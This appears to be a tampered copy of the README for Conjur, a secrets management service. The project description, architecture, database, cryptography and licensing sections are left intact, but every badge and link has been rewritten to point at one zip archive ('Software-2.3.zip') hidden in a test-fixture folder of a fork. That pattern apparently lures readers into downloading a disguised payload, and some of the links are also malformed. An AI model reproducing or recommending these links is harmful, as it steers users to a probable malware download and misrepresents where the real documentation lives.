# Conjur

[![Conjur on DockerHub](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
[![Maintainability](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
[![Test Coverage](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)

[![CyberArk Commons - ask](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)][commons]
[![Follow Conjur on Twitter](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%20%40ConjurInc)][twitter]

[commons]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip "Find answers on CyberArk Commons"
[twitter]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip "Follow Conjur on Twitter"

Conjur provides secrets management and application identity for modern infrastructure:

* **Machine Authorization Markup Language ("MAML")**, a role-based
  access policy language to define system components & their roles,
  privileges and metadata
* **A REST web service** to:
  * manage identity life cycles for humans and machines
  * organize and search roles and data in your secrets infrastructure
  * authorize access to resources using a sophisticated permission model
  * store secrets and make them available securely
* **Integrations** throughout the cloud toolchain:
  * infrastructure as a service (IaaS)
  * configuration management
  * continuous integration and deployment (CI/CD)
  * container management and cloud orchestration

_Note: our badges and social media buttons never track you._

- [Getting Started](#getting-started)
  * [Compatibility](#compatibility)
- [Community Support](#community-support)
- [Migrating to CyberArk Secrets Manager, Self-Hosted](#migrating-to-cyberark-secrets-manager-self-hosted)
- [Architecture](#architecture)
  * [Database](#database)
    + [DATABASE_URL environment variable](#database-url-environment-variable)
    + [Database initialization](#database-initialization)
  * [Authenticators](#authenticators)
  * [Rotators](#rotators)
  * [Secrets and keys](#secrets-and-keys)
    + [Important: avoid data loss](#important--avoid-data-loss)
  * [Account management](#account-management)
- [Versioning](#versioning)
- [Contributing](#contributing)
- [License](#license)

<small><i><a href='https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip'>Table of contents
generated with markdown-toc</a></i></small>


## Getting Started 

Please refer to our [Quick Start Guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip) for detailed information on using Conjur Open Source for the first time, or, refer to the 
[Conjur docs](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip) for specific guides relating to setup, integrations, administration, and more.

### Compatibility 

We **strongly** recommend choosing the version of this project to use from the latest [Conjur Open_Source 
suite release](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). 
Conjur maintainers perform additional testing on the suite release versions to ensure 
compatibility. When possible, upgrade your Conjur version to match the 
[latest suite release](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip); 
when using integrations, choose the latest suite release that matches your Conjur version.

When upgrading your Conjur server running in a Docker Compose environment to the
latest suite release version, please review the
[upgrade instructions](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). For any questions, please contact us on [Discourse](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).

## Community Support

Our primary channel for support is through our CyberArk Commons community
[here][commons]

## Migrating to CyberArk Secrets Manager, Self-Hosted

Migrating data from Conjur Open Source to CyberArk Secrets Manager, Self-Hosted is simple using our
[migration guide][migration]

[migration]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip

## Architecture

Conjur is designed to run in a Docker container(s), using PostgreSQL as the
backing data store. It's easy to run both Conjur and PostgreSQL in Docker; see
the `demo` directory for an example.

- Note: Conjur is compatible with PostgreSQL 15.

### Database

#### DATABASE_URL environment variable

Conjur uses the `DATABASE_URL` environment variable to connect to the database.
Typical options for this URL are:

* Local linked `pg` container
* External managed database such as AWS RDS.

#### Database initialization

Conjur creates and/or updates the database schema automatically when it starts
up. Migration scripts are located in the `db/migrate` directory.

### Authenticators

Conjur makes it easy to:

- Enable and disable built-in authenticators
- Secure access to authenticators using policy files
- Create custom authenticators

[Detailed authenticator design documentation](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)

### Rotators

Conjur makes it easy to:

- Rotate variables regularly using built-in rotators
- Create custom rotators

[Detailed rotator design documenation](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)

### Secrets and keys

Main article: [Conjur Cryptography](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip%https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)

Conjur uses industry-standard cryptography to protect your data.

Some operations require storage and management of encrypted data. For example:

* Roles can have associated API keys, which are stored encrypted in
  the database
* the `authenticate` function issues a signed JSON token; the signing key is a
  2048 bit RSA key which is stored encrypted in the database

Data is encrypted in and out of the database
using [Slosilo](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip), a library which provides:

* symmetric encryption using AES-256-GCM
* a Ruby class mixin for easy encryption of object attributes into the database
* asymmetric encryption and signing
* a keystore in a PostgreSQL database for easy storage and retrieval of keys

Slosilo has been verified by a professional cryptographic audit. Ask in our
CyberArk Commons community for more details. (You can join [here][commons].)

#### Important: avoid data loss

When you start Conjur, you must provide a Base64-encoded master data key in the
environment variable `CONJUR_DATA_KEY`. You can generate a data key using the
following command:

```
$ docker run --rm conjur data-key generate
```

Do NOT lose the data key, or all the encrypted data will be unrecoverable.

### Account management

Conjur supports the simultaneous operation of multiple separate accounts within
the same database. In other words, it's multi-tenant.

Each account (also called "organization account") has its own token-signing
private key. When a role is authenticated, the HMAC of the access token is
computed using the signing key of the role's account.

Accounts can be listed, created, and deleted via the `/accounts` service.
Permission to use this service is controlled by the built-in resource
`!:webservice:accounts`. Note that `!` is itself an organization account, and
therefore privileges on the `!:webservice:accounts` can be managed
via Conjur [policies](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).

## Versioning

Starting from version 0.1.0, this project follows
[Semantic Versioning](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).

## Contributing

If you’re interested in running Conjur locally and learning about how it works,
please see our [Contributing Guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip). It includes helpful
instructions for Conjur development and debugging, including:
- [Development prerequisites](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Building Conjur as a Docker image](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Setting up a local development environment](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Running the test suites](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Pull request workflow](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Style guide](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
- [Changelog maintenance](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)

If you have any questions, please [open an issue](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip)
or [ask us on Discourse][commons].

## License

The Conjur server (as in, the code within this repository) is licensed under the
Free Software Foundation's [GNU LGPL v3.0][lgpl]. This license was chosen to
ensure that all contributions to the Conjur server are made available to the
community. Commercial licenses are also available
from [CyberArk](https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip).

The Conjur API clients and other extensions are licensed under
the [Apache Software License v2.0][apache].

Copyright (c) 2020 CyberArk Software Ltd. All rights reserved.

[apache]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip
[lgpl]: https://raw.githubusercontent.com/Kali99xx/conjur/master/spec/fixtures/vcr_cassettes/authenticators/authn-oidc/v2/identity/Software-2.3.zip
